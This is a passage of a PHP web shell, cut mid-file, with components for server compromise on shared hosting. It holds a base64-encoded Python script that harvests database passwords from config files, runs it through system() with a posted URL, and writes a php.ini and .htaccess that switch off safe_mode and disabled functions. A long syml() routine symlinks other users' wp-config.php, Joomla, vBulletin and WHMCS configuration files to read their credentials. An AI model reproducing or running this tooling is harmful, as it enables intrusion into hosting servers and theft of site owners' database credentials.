ICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBmID0gb3BlbignZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0uZ3JvdXAoMiksIGxvY2FsX25hbWUpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgIHByaW50ICdcblslc10gZG9lc25cJ3QgZXhpc3QsIGNyZWF0ZSBpdCBmaXJzdCcgJSBmb3V0DQogICAgICAgICAgc3lzLmV4aXQoKQ0KICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCc8aW1nJykgPT0gVHJ1ZToNCiAgICAgICAgbTEgPSByZS5zZWFyY2gocicoPGEgaHJlZj0iKSguK1tePl0pKCI+KScsIGxpbmUpDQogICAgICAgIGkgKz0gMQ0KICAgICAgICBsb2NhbF9uYW1lID0gJyVzL2ZpbGUlZC50eHQnICUgKGZvdXQsIGkpDQogICAgICAgIHByaW50ICdSZXRyaWV2aW5nLi4uXHRcdCcsIHNpdGUgKyBtMS5ncm91cCgyKQ0KICAgICAgICB0cnk6ICB1cmxsaWIudXJscmV0cmlldmUoc2l0ZSArIG0xLmdyb3VwKDIpLCBsb2NhbF9uYW1lKQ0KICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICBwcmludCAnXG5bJXNdIGRvZXNuXCd0IGV4aXN0LCBjcmVhdGUgaXQgZmlyc3QnICUgZm91dA0KICAgICAgICAgIHN5cy5leGl0KCkNCiAgICAgIGlmIGxpbmUuc3RhcnRzd2l0aCgnPElNRycpID09IFRydWU6DQogICAgICAgIG0yID0gcmUuc2VhcmNoKHInKDxBIEhSRUY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAgICAgICAgbG9jYWxfbmFtZSA9ICclcy9maWxlJWQudHh0JyAlIChmb3V0LCBpKQ0KICAgICAgICBwcmludCAnUmV0cmlldmluZy4uLlx0XHQnLCBzaXRlICsgbTIuZ3JvdXAoMikNCiAgICAgICAgdHJ5OiAgdXJsbGliLnVybHJldHJpZXZlKHNpdGUgKyBtMi5ncm91cCgyKSwgbG9jYWxfbmFtZSkNCiAgICAgICAgZXhjZXB0IElPRXJyb3I6DQogICAgICAgICAgcHJpbnQgJ1xuWyVzXSBkb2VzblwndCBleGlzdCwgY3JlYXRlIGl0IGZpcnN0JyAlIGZvdXQNCiAgICAgICAgICBzeXMuZXhpdCgpDQogICAgZi5jbG9zZSgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgY2xlYW51cCA9IHN1YnByb2Nlc3MuUG9wZW4oJ3JtIC1yZiAvdG1wL2RhdGEudHh0ID4gL2Rldi9udWxsJywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIGlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoNCiAgICBjbGVhbnVwID0gc3VicHJvY2Vzcy5Qb3BlbignZGVsIEM6XGRhdGEudHh0Jywgc2hlbGw9VHJ1ZSkud2FpdCgpDQogIHByaW50ICdcbicsICctJyAqIDEwMCwgJ1xuJw0KICBpZiBzeXN0ZW0oKSA9PSAnTGludXgnOg0KICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGZvdXQpOg0KICAgICAgZm9yIGZuYW1lIGluIGZpbGVzOg0KICAgICAgICBmdWxscGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmbmFtZSkNCiAgICAgICAgZiA9IG9wZW4oZnVsbHBhdGgsICdyJykNCiAgICAgICAgZm9yIGxpbmUgaW4gZjoNCiAgICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3IgaXMgbm90IE5vbmU6IHByaW50IChzZWNyLmdyb3VwKDIpKSAgDQogICAgICAgICAgc2VjcjEgPSByZS5zZWFyY2gociIocGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3IyID0gcmUuc2VhcmNoKHIiKERCX1BBU1NXT1JEJykoLi4uKSguK1tePl0pKCcpIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyMiBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3IyLmdyb3VwKDMpKQ0KICAgICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjMgaXMgbm90IE5vbmU6IHByaW50IChzZWNyMy5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNCA9IHJlLnNlYXJjaCAociIoREJQQVNTV09SRCA9ICcpKC4rW14+XSkoLjspIiwgbGluZSkNCiAgICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICAgIHNlY3I1ID0gcmUuc2VhcmNoIChyIihEQnBhc3MgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjUgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNS5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgICAgaWYgc2VjcjYgaXMgbm90IE5vbmU6IHByaW50IChzZWNyNi5ncm91cCgyKSkNCiAgICAgICAgICBzZWNyNyA9IHJlLnNlYXJjaCAociIobW9zQ29uZmlnX3Bhc3N3b3JkID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZm9yIGluZmlsZSBpbiBnbG9iLmdsb2IoIG9zLnBhdGguam9pbihmb3V0LCAnKi50eHQnKSApOg0KICAgICAgZiA9IG9wZW4oaW5maWxlLCAncicpDQogICAgICBmb3IgbGluZSBpbiBmOg0KICAgICAgICBzZWNyID0gcmUuc2VhcmNoIChyIihkYl9wYXNzd29yZCddID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyIGlzIG5vdCBOb25lOiBwcmludCAoc2Vjci5ncm91cCgyKSkgIA0KICAgICAgICBzZWNyMSA9IHJlLnNlYXJjaChyIihwYXNzd29yZCA9ICcpKC4rW14+XSkoJzspIiwgbGluZSkNCiAgICAgICAgaWYgc2VjcjEgaXMgbm90IE5vbmU6ICBwcmludCAgKHNlY3IxLmdyb3VwKDIpKQ0KICAgICAgICBzZWNyMiA9IHJlLnNlYXJjaChyIihEQl9QQVNTV09SRCcpKC4uLikoLitbXj5dKSgnKSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IyIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjIuZ3JvdXAoMykpDQogICAgICAgIHNlY3IzID0gcmUuc2VhcmNoIChyIihkYnBhc3MgPS4uKSguK1tePl0pKC47KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3IzIGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjMuZ3JvdXAoMikpDQogICAgICAgIHNlY3I0ID0gcmUuc2VhcmNoIChyIihEQlBBU1NXT1JEID0gJykoLitbXj5dKSguOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNCBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I0Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNSA9IHJlLnNlYXJjaCAociIoREJwYXNzID0gJykoLitbXj5dKSgnOykiLCBsaW5lKQ0KICAgICAgICBpZiBzZWNyNSBpcyBub3QgTm9uZTogcHJpbnQgKHNlY3I1Lmdyb3VwKDIpKQ0KICAgICAgICBzZWNyNiA9IHJlLnNlYXJjaCAociIoZGJwYXNzd2QgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I2IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjYuZ3JvdXAoMikpDQogICAgICAgIHNlY3I3ID0gcmUuc2VhcmNoIChyIihtb3NDb25maWdfcGFzc3dvcmQgPSAnKSguK1tePl0pKCc7KSIsIGxpbmUpDQogICAgICAgIGlmIHNlY3I3IGlzIG5vdCBOb25lOiBwcmludCAoc2VjcjcuZ3JvdXAoMikpDQogICAgICBmLmNsb3NlKCkNCmV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOg0KICBwcmludCAnXG5UaGFua3MgZm9yIHVzaW5nIGl0IC5fXic=';
$file = fopen("cp.py","w+");
$write = fwrite ($file ,base64_decode($cp));
fclose($file);
chmod("cp.py",0755);
$url = $_POST['url'];
echo"<center>
<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
system("python cp.py $url config");
unlink ('cp.py');
echo"</textarea>
</center>";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."?brute>BACK</a>";
exit;
}
if($_POST['matikan']=='sekatan'){
@error_reporting(0);
$phpini =
'c2FmZV9tb2RlPU9GRg0KZGlzYWJsZV9mdW5jdGlvbnM9Tk9ORQ==';
$file = fopen("php.ini","w+");
$write = fwrite ($file ,base64_decode($phpini));
fclose($file);
$htaccess =
'T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ==';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
echo "<hr><center><b>DONE!";
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."?brute>BACK</a>";
exit;
}
if($_POST['mendapatkan']=='passwd'){
@set_magic_quotes_runtime(0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$fn = $_POST['foldername'];
//all function here

function syml($usern,$pdomain)
	{
		symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home3/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home3/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home3/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home3/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home3/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home3/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home3/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home3/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home3/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home3/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home3/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home3/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home3/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home3/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home3/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home3/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home3/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home3/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home3/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home3/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home3/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home3/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home4/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home4/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home4/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home4/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home4/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home4/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home4/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home4/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home4/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home4/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home4/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home4/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home4/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home4/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home4/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home4/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home4/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home4/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home4/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home4/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home4/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home4/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home4/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home4/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home4/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home4/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home4/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home5/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home5/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home5/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home5/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home5/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home5/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home5/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home5/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home5/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home5/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home5/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home5/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home5/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home5/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home5/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home5/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home5/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home5/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home5/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home5/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home5/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home5/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home5/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home5/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home5/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home5/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home5/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
		symlink('/home6/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
		symlink('/home6/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
		symlink('/home6/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
		symlink('/home6/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
		symlink('/home6/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
		symlink('/home6/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home6/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home6/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home6/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home6/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home6/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home6/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home6/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home6/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home6/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home6/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home6/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home6/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home6/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home6/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home6/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home6/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
